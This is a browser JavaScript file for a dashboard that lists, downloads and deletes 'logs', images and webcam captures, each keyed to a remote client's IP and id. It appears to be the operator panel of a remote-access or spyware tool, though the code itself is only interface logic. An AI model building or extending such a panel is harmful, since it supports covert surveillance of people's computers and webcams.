var imagesSelected = [];
var webcamsSelected = [];


function open_change_nick() {
    const button = document.getElementById("change_nick_button")
    const edit_button = document.getElementById('nick_input')
    const nick = document.getElementById('nick')

    nick.style.display = "none"
    edit_button.style.display = "block"

    button.onclick = function () {
        close_change_nick()
    }
}

function close_change_nick() {
    const button = document.getElementById("change_nick_button")
    const edit_button = document.getElementById('nick_input')
    const nick = document.getElementById('nick')


    nick.style.display = "block"
    edit_button.style.display = "none"

    button.onclick = function () {
        open_change_nick()
    }

}

function change_nick() {
    const form = document.getElementById("nick_form")
    form.submit()
}


function close_alert(id) {
    document.getElementById(id).style.display = "none";
}

function log_visible() {
    const logs = document.getElementById("logs");
    const webcam = document.getElementById("webcam");
    const webcamContent = document.getElementById("webcam_content");
    const webcamButtons = document.getElementById("webcam_buttons");
    const logsContent = document.getElementById("logs_content");
    const images = document.getElementById("images");
    const log_buttons = document.getElementById("log_buttons");
    const imagesConetent = document.getElementById("images_content");
    const image_buttons = document.getElementById("image_buttons");

    imagesConetent.style.display = "none";
    logsContent.style.display = "block";
    log_buttons.style.display = "inline-block";
    image_buttons.style.display = "none";
    webcamContent.style.display = "none";
    webcamButtons.style.display = "none";

    logs.classList.add("active");
    images.classList.remove("active");
    webcam.classList.remove("active")
}

function image_visible() {
    const logs = document.getElementById("logs");
    const logsContent = document.getElementById("logs_content");
    const webcam = document.getElementById("webcam");
    const webcamContent = document.getElementById("webcam_content");
    const webcamButtons = document.getElementById("webcam_buttons");
    const images = document.getElementById("images");
    const log_buttons = document.getElementById("log_buttons");
    const imagesConetent = document.getElementById("images_content");
    const image_buttons = document.getElementById("image_buttons");

    logsContent.style.display = "none";
    imagesConetent.style.display = "block";
    log_buttons.style.display = "none";
    image_buttons.style.display = "inline-block";
    webcamContent.style.display = "none";
    webcamButtons.style.display = "none";

    images.classList.add("active");
    logs.classList.remove("active");
    webcam.classList.remove("active")
}

function webcam_visible() {

    const logs = document.getElementById("logs");
    const logsContent = document.getElementById("logs_content");
    const webcam = document.getElementById("webcam");
    const webcamContent = document.getElementById("webcam_content");
    const webcamButtons = document.getElementById("webcam_buttons");
    const images = document.getElementById("images");
    const log_buttons = document.getElementById("log_buttons");
    const imagesConetent = document.getElementById("images_content");
    const image_buttons = document.getElementById("image_buttons");

    logsContent.style.display = "none";
    imagesConetent.style.display = "none";
    log_buttons.style.display = "none";
    image_buttons.style.display = "none";
    webcamContent.style.display = "block";
    webcamButtons.style.display = "inline-block";

    images.classList.remove("active");
    logs.classList.remove("active");
    webcam.classList.add("active")
}


function openImage(image) {

    image = document.getElementById(image)
    //rgba(0,0,0,.6)
    image.border.color = "#5bc0de"

}

function delete_logs(ip, id) {
    window.open('/delete/' + ip + "," + id + '?logs=' + 0,"_self")
}


function selectImage(image_id) {

    const image = document.getElementById(image_id);


    //rgba(0,0,0,.6)
    image.style.borderColor = "#5bc0de";

    addImageToCounter(image_id)
    console.log(imagesSelected.length)
    image.onclick = function () {
        deselectImage(image_id)
    }

}


function deselectImage(image_id) {
    const image = document.getElementById(image_id);

    //rgba(0,0,0,.6)
    image.style.borderColor = "rgba(0,0,0,.6)";

    removeImageFromCounter(image_id)
    console.log(imagesSelected.length)
    image.onclick = function () {
        selectImage(image_id)
    }

}

function addImageToCounter(image_id) {
    imagesSelected.push(image_id)
    checkImageCounter()
}

function removeImageFromCounter(image_id) {
    var a = imagesSelected.splice(imagesSelected.indexOf(image_id), 1)

    checkImageCounter()
}

function checkImageCounter() {
    const download_button = document.getElementById("image_download")
    const delete_button = document.getElementById("delete_image_button")
    if (imagesSelected.length === 0) {
        download_button.classList.add("disabled");
        delete_button.classList.add("disabled")
    } else {
        download_button.classList.remove("disabled");
        delete_button.classList.remove("disabled")

    }
}

function imageDownload(ip, id) {

    console.log(imagesSelected.length)
    if (imagesSelected.length === 0) return;
    if (imagesSelected.length === 1) window.open('/uploads/' + ip + "," + id + '/' + imagesSelected[0] + '/image')
    else {

        var arrStr = encodeURIComponent(JSON.stringify(imagesSelected));
        window.open('/download zip/' + ip + "," + id + '?images=' + arrStr)

    }
}

function imageDelete(ip,id) {
    if (imagesSelected.length === 0) return;
    let arrStr = encodeURIComponent(JSON.stringify(imagesSelected));
    window.open('/delete/' + ip + "," + id + '?images=' + arrStr)

}

function imgSelectAll() {
    const image_container = document.getElementById("images_content")
    const select_all = document.getElementById("imageSelectAll")
    for (let i = 0; i < image_container.children.length; i++) {
        if (image_container.children[i].style.borderColor !== "#5bc0de") {
            selectImage(image_container.children[i].id);
        }

    }
    select_all.onclick = function () {
        imgDeselectAll()
    }
    select_all.textContent = "Deselect all"
}

function imgDeselectAll() {
    const image_container = document.getElementById("images_content")
    const select_all = document.getElementById("imageSelectAll")
    for (let i = 0; i < image_container.children.length; i++) {
        if (image_container.children[i].style.borderColor !== "rgba(0,0,0,.6)") {
            deselectImage(image_container.children[i].id);
        }

    }
    select_all.onclick = function () {
        imgSelectAll()
    }
    select_all.textContent = "Select all"
}


//webcam section


function webcamSelectAll() {
    const image_container = document.getElementById("webcam_content")
    const select_all = document.getElementById("webcamSelectAll")
    for (let i = 0; i < image_container.children.length; i++) {
        if (image_container.children[i].style.borderColor !== "#5bc0de") {
            selectWebcam(image_container.children[i].id);
        }

    }
    select_all.onclick = function () {
        webcamDeselectAll()
    }
    select_all.textContent = "Deselect all"
}

function webcamDeselectAll() {
    const image_container = document.getElementById("webcam_content")
    const select_all = document.getElementById("webcamSelectAll")
    for (let i = 0; i < image_container.children.length; i++) {
        if (image_container.children[i].style.borderColor !== "rgba(0,0,0,.6)") {
            deselectWebcam(image_container.children[i].id);
        }

    }
    select_all.onclick = function () {
        webcamSelectAll()
    }
    select_all.textContent = "Select all"
}

function selectWebcam(image_id) {

    const image = document.getElementById(image_id);


    //rgba(0,0,0,.6)
    image.style.borderColor = "#5bc0de";

    addWebcamToCounter(image_id)
    console.log(imagesSelected.length)
    image.onclick = function () {
        deselectWebcam(image_id)
    }

}

function deselectWebcam(image_id) {
    const image = document.getElementById(image_id);

    //rgba(0,0,0,.6)
    image.style.borderColor = "rgba(0,0,0,.6)";

    removeWebcamFromCounter(image_id)
    console.log(imagesSelected.length)
    image.onclick = function () {
        selectWebcam(image_id)
    }

}

function checkWebcamCounter() {
    const download_button = document.getElementById("webcam_download")
    const delete_button = document.getElementById("delete_webcam_button")
    if (webcamsSelected.length === 0) {
        download_button.classList.add("disabled");
        delete_button.classList.add("disabled")
    } else {
        download_button.classList.remove("disabled");
        delete_button.classList.remove("disabled")

    }
}

function addWebcamToCounter(image_id) {
    webcamsSelected.push(image_id)
    checkWebcamCounter()
}

function removeWebcamFromCounter(image_id) {
    var a = webcamsSelected.splice(webcamsSelected.indexOf(image_id), 1)

    checkWebcamCounter()
}

function webcamDownload(ip, id) {

    console.log(webcamsSelected.length)
    if (webcamsSelected.length === 0) return;
    if (webcamsSelected.length === 1) window.open('/uploads/' + ip + "," + id + '/' + webcamsSelected[0] + '/webcam')
    else {

        var arrStr = encodeURIComponent(JSON.stringify(webcamsSelected));
        window.open('/download zip/' + ip + "," + id + '?webcams=' + arrStr)

    }
}

function webcamDelete(ip, id) {
    if (webcamsSelected.length === 0) return;
    let arrStr = encodeURIComponent(JSON.stringify(webcamsSelected));
    window.open('/delete/' + ip + "," + id + '?webcams=' + arrStr)

}

function fetch_data(ip, id, type) {
    window.open('/retrieve/' + ip + "," + id + "/" + type,"_self")
}

function show_image(img_name,ip,id,type)
{
    window.open('/clients/'+ip+","+id+"/"+img_name+"/"+type,"_self");
}
